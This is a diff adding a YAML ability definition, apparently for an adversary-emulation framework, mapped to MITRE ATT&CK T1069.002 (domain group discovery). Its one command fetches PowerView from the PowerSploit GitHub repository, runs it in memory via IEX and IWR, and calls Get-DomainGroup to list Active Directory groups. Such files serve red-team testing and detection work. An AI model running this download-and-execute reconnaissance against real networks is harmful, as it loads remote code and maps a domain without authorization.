@@ -1,0 +1,21 @@
+- description: 'Utilizing PowerView, run Get-DomainGroup to identify the domain groups.
+    Upon execution, Groups within the domain will be listed.
+
+    '
+  id: 57781057-e51f-fecf-21e3-8fd31c9d2f79
+  name: Get-DomainGroup with PowerView
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1''
+          -UseBasicParsing); Get-DomainGroup -verbose'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1069.002
+    name: 'Permission Groups Discovery: Domain Groups'
